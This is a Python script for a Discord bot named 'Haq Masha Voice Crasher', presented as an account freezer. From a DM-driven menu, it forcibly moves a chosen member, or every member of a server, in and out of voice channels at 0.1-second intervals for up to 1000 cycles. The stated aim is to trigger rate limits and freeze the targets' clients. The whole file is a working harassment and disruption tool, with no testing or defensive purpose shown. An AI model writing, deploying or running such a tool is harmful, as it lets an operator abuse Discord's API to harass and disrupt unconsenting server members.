import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import json
import threading

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗          ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗         ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║         ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║         ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
║                                                                                       ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██╗ ██████╗███████╗                   ║
║                    ██║   ██║██╔═══██╗████╗  ██║██║██╔════╝██╔════╝                   ║
║                    ██║   ██║██║   ██║██╔██╗ ██║██║██║     █████╗                     ║
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║██║     ██╔══╝                     ║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║██║╚██████╗███████╗                   ║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝                   ║
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA VOICE CRASHER v1.0                  ║  ║
║                    ║          VOICE JOINER + ACCOUNT FREEZER                      ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# CONFIG
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# Data storage
voice_targets = {}  # {user_id: {"count": 0, "max_count": 0, "running": False, "voice_ids": []}}
active_spams = {}

# ============================================
# MESSAGES
# ============================================
PANEL_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    🎧 HAQ MASHA VOICE CRASHER PANEL 🎧                        ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐  ║
║  │                                                                         │  ║
║  │  1️⃣  ADD VOICE CHANNEL ID      - Add voice channels to crash list    │  ║
║  │                                                                         │  ║
║  │  2️⃣  REMOVE VOICE CHANNEL ID   - Remove voice channels from list     │  ║
║  │                                                                         │  ║
║  │  3️⃣  SHOW VOICE CHANNELS       - Show all added voice channels       │  ║
║  │                                                                         │  ║
║  │  4️⃣  START VOICE SPAM          - Start joining/leaving all members   │  ║
║  │                                                                         │  ║
║  │  5️⃣  STOP VOICE SPAM           - Stop all voice spam                 │  ║
║  │                                                                         │  ║
║  │  6️⃣  CRASH SPECIFIC USER       - Crash a specific user by ID         │  ║
║  │                                                                         │  ║
║  │  7️⃣  CRASH ALL MEMBERS         - Crash every member in the server    │  ║
║  │                                                                         │  ║
║  │  8️⃣  SET CRASH COUNT           - Set how many joins/leaves per user  │  ║
║  │                                                                         │  ║
║  │  9️⃣  EXIT PANEL                - Close this panel                     │  ║
║  │                                                                         │  ║
║  └─────────────────────────────────────────────────────────────────────────┘  ║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================
# VOICE JOINER/LEAVER (ACCOUNT CRASHER)
# ============================================
async def voice_joiner_loop(user, voice_channels, iterations, guild):
    """
    Make a user join and leave voice channels rapidly
    This causes Discord to rate limit and potentially freeze the account
    """
    if not voice_channels:
        return
    
    for i in range(iterations):
        if not active_spams.get(user.id, True):
            break
            
        for vc in voice_channels:
            try:
                # Move user to voice channel
                await user.move_to(vc)
                await asyncio.sleep(0.1)
                
                # Move user away (disconnect)
                await user.move_to(None)
                await asyncio.sleep(0.1)
                
            except Exception as e:
                pass
        
        # Update progress
        if i % 10 == 0:
            try:
                await user.send(f"```🔥 VOICE CRASH IN PROGRESS: {i+1}/{iterations} cycles 🔥```")
            except:
                pass
    
    # Mark as done
    if user.id in voice_targets:
        voice_targets[user.id]["running"] = False
    
    try:
        await user.send(f"```✅ VOICE CRASH COMPLETED: {iterations} cycles on {len(voice_channels)} channels ✅```")
    except:
        pass

async def crash_user(member, voice_channels, iterations, guild):
    """Crash a single user by making them join/leave voice channels"""
    
    # Check if user is in a voice channel
    if member.voice and member.voice.channel:
        try:
            await member.move_to(None)
            await asyncio.sleep(0.5)
        except:
            pass
    
    # Store target info
    voice_targets[member.id] = {
        "count": 0,
        "max_count": iterations,
        "running": True,
        "voice_ids": [vc.id for vc in voice_channels]
    }
    
    active_spams[member.id] = True
    
    # Start crashing
    await voice_joiner_loop(member, voice_channels, iterations, guild)

# ============================================
# PANEL HANDLER
# ============================================
class VoiceCrasherPanel:
    def __init__(self, user, guild, voice_channels=None):
        self.user = user
        self.guild = guild
        self.voice_channels = voice_channels or []
        self.running = True
        self.crash_count = 100  # Default crash cycles
    
    async def send_panel(self):
        await self.user.send(PANEL_MESSAGE)
        await self.user.send(f"```📊 CURRENT STATUS:\n• Voice Channels: {len(self.voice_channels)}\n• Crash Cycles: {self.crash_count}\n• Active Spams: {len(active_spams)}```")
    
    async def handle_choice(self, choice):
        if choice == "1":
            # Add voice channel
            await self.user.send("📢 **ENTER VOICE CHANNEL ID:**")
            def check(m):
                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
            
            try:
                msg = await bot.wait_for('message', timeout=30.0, check=check)
                vc_id = int(msg.content)
                vc = self.guild.get_channel(vc_id)
                
                if vc and isinstance(vc, discord.VoiceChannel):
                    if vc not in self.voice_channels:
                        self.voice_channels.append(vc)
                        await self.user.send(f"✅ **ADDED:** {vc.name} (ID: {vc.id})")
                    else:
                        await self.user.send("❌ **CHANNEL ALREADY ADDED!**")
                else:
                    await self.user.send("❌ **INVALID VOICE CHANNEL ID!**")
            except ValueError:
                await self.user.send("❌ **INVALID ID!**")
            except asyncio.TimeoutError:
                await self.user.send("⏰ **TIMEOUT!**")
        
        elif choice == "2":
            # Remove voice channel
            if not self.voice_channels:
                await self.user.send("❌ **NO VOICE CHANNELS TO REMOVE!**")
                return
            
            msg = "**📋 YOUR VOICE CHANNELS:**\n\n"
            for i, vc in enumerate(self.voice_channels, 1):
                msg += f"`{i}. {vc.name} (ID: {vc.id})`\n"
            msg += "\n📢 **ENTER NUMBER TO REMOVE:**"
            await self.user.send(msg)
            
            def check(m):
                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
            
            try:
                response = await bot.wait_for('message', timeout=30.0, check=check)
                num = int(response.content)
                if 1 <= num <= len(self.voice_channels):
                    removed = self.voice_channels.pop(num-1)
                    await self.user.send(f"✅ **REMOVED:** {removed.name}")
                else:
                    await self.user.send("❌ **INVALID NUMBER!**")
            except:
                await self.user.send("❌ **INVALID INPUT!**")
        
        elif choice == "3":
            # Show voice channels
            if not self.voice_channels:
                await self.user.send("❌ **NO VOICE CHANNELS ADDED YET!**")
            else:
                msg = "**📋 YOUR VOICE CHANNELS:**\n```\n"
                for i, vc in enumerate(self.voice_channels, 1):
                    msg += f"{i}. {vc.name} (ID: {vc.id})\n"
                msg += f"\nTotal: {len(self.voice_channels)} channels```"
                await self.user.send(msg)
        
        elif choice == "4":
            # Start voice spam
            if not self.voice_channels:
                await self.user.send("❌ **ADD VOICE CHANNELS FIRST!**")
                return
            
            await self.user.send(f"```🔥 STARTING VOICE SPAM ON ALL MEMBERS! 🔥\n• Channels: {len(self.voice_channels)}\n• Cycles per user: {self.crash_count}\n• This will freeze their Discord!```")
            
            members = self.guild.members
            total = len([m for m in members if not m.bot])
            
            await self.user.send(f"👥 **TARGETING {total} MEMBERS...**")
            
            crashed = 0
            for member in members:
                if not member.bot:
                    try:
                        await crash_user(member, self.voice_channels, self.crash_count, self.guild)
                        crashed += 1
                        await self.user.send(f"✅ **CRASHED {crashed}/{total}**")
                        await asyncio.sleep(0.5)
                    except:
                        pass
            
            await self.user.send(f"```✅ VOICE CRASH COMPLETED! {crashed} MEMBERS FROZEN!```")
        
        elif choice == "5":
            # Stop voice spam
            active_spams.clear()
            voice_targets.clear()
            await self.user.send("```🛑 ALL VOICE SPAMS STOPPED! 🛑```")
        
        elif choice == "6":
            # Crash specific user
            await self.user.send("📢 **ENTER USER ID TO CRASH:**")
            def check(m):
                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
            
            try:
                msg = await bot.wait_for('message', timeout=30.0, check=check)
                user_id = int(msg.content)
                member = self.guild.get_member(user_id)
                
                if member and not member.bot:
                    await self.user.send(f"```🔥 CRASHING: {member.name}\n• Cycles: {self.crash_count}\n• Channels: {len(self.voice_channels)}```")
                    await crash_user(member, self.voice_channels, self.crash_count, self.guild)
                    await self.user.send(f"✅ **CRASHED {member.name}**")
                else:
                    await self.user.send("❌ **USER NOT FOUND OR IS A BOT!**")
            except:
                await self.user.send("❌ **INVALID INPUT!**")
        
        elif choice == "7":
            # Crash all members
            if not self.voice_channels:
                await self.user.send("❌ **ADD VOICE CHANNELS FIRST!**")
                return
            
            confirm = await self.user.send("⚠️ **CRASH ALL MEMBERS? TYPE 'yes' TO CONFIRM:**")
            
            def check(m):
                return m.author == self.user and isinstance(m.channel, discord.DMChannel) and m.content.lower() == 'yes'
            
            try:
                await bot.wait_for('message', timeout=10.0, check=check)
                await self.user.send(f"```🔥 CRASHING ALL {len([m for m in self.guild.members if not m.bot])} MEMBERS...```")
                
                crashed = 0
                for member in self.guild.members:
                    if not member.bot:
                        try:
                            await crash_user(member, self.voice_channels, self.crash_count, self.guild)
                            crashed += 1
                            await asyncio.sleep(0.3)
                        except:
                            pass
                
                await self.user.send(f"```✅ CRASHED {crashed} MEMBERS!```")
            except:
                await self.user.send("❌ **CANCELLED!**")
        
        elif choice == "8":
            # Set crash count
            await self.user.send("📢 **ENTER CRASH CYCLES PER USER (default 100, max 1000):**")
            def check(m):
                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
            
            try:
                msg = await bot.wait_for('message', timeout=30.0, check=check)
                count = int(msg.content)
                if 1 <= count <= 1000:
                    self.crash_count = count
                    await self.user.send(f"✅ **CRASH CYCLES SET TO: {count}**")
                else:
                    await self.user.send("❌ **ENTER NUMBER BETWEEN 1-1000!**")
            except:
                await self.user.send("❌ **INVALID NUMBER!**")
        
        elif choice == "9":
            # Exit
            self.running = False
            await self.user.send("```🚪 EXITING PANEL... GOODBYE!```")
            return False
        
        return True

# ============================================
# MAIN BOT EVENTS
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✓ BOT ONLINE: {bot.user.name}
║              ✓ BOT ID: {bot.user.id}
║              ✓ SERVERS: {len(bot.guilds)}
║                                                                               ║
║              ┌─────────────────────────────────────────────────────────────┐  ║
║              │  TYPE 'v' IN DM TO OPEN THE VOICE CRASHER PANEL            │  ║
║              │  ADD VOICE CHANNEL IDs AND START CRASHING!                 │  ║
║              └─────────────────────────────────────────────────────────────┘  ║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    # Check if DM and message is 'v'
    if isinstance(message.channel, discord.DMChannel) and message.content.lower() == 'v':
        await message.channel.send("```🔥 HAQ MASHA VOICE CRASHER PANEL LOADING... 🔥```")
        
        # Get first guild (server)
        if not bot.guilds:
            await message.channel.send("❌ **BOT IS NOT IN ANY SERVER!**")
            return
        
        guild = bot.guilds[0]
        
        # Show server selection if multiple
        if len(bot.guilds) > 1:
            server_msg = "**📋 SELECT SERVER TO CRASH:**\n\n```\n"
            for i, g in enumerate(bot.guilds, 1):
                server_msg += f"{i}. {g.name} (Members: {len(g.members)})\n"
            server_msg += "```\n📢 **ENTER SERVER NUMBER:**"
            await message.channel.send(server_msg)
            
            def check(m):
                return m.author == message.author and isinstance(m.channel, discord.DMChannel)
            
            try:
                response = await bot.wait_for('message', timeout=30.0, check=check)
                num = int(response.content)
                if 1 <= num <= len(bot.guilds):
                    guild = bot.guilds[num-1]
                else:
                    await message.channel.send("❌ **INVALID SELECTION!**")
                    return
            except:
                await message.channel.send("❌ **TIMEOUT!**")
                return
        
        # Create and run panel
        panel = VoiceCrasherPanel(message.author, guild)
        await panel.send_panel()
        
        while panel.running:
            await message.channel.send("```📌 ENTER CHOICE (1-9):```")
            
            def check(m):
                return m.author == message.author and isinstance(m.channel, discord.DMChannel)
            
            try:
                response = await bot.wait_for('message', timeout=60.0, check=check)
                if response.content in [str(i) for i in range(1, 10)]:
                    running = await panel.handle_choice(response.content)
                    if not running:
                        break
                    await panel.send_panel()
                else:
                    await message.channel.send("❌ **INVALID CHOICE! ENTER 1-9**")
            except asyncio.TimeoutError:
                await message.channel.send("```⏰ PANEL TIMEOUT - EXITING...```")
                break

# ============================================
# RUN BOT
# ============================================
bot.run(TOKEN)
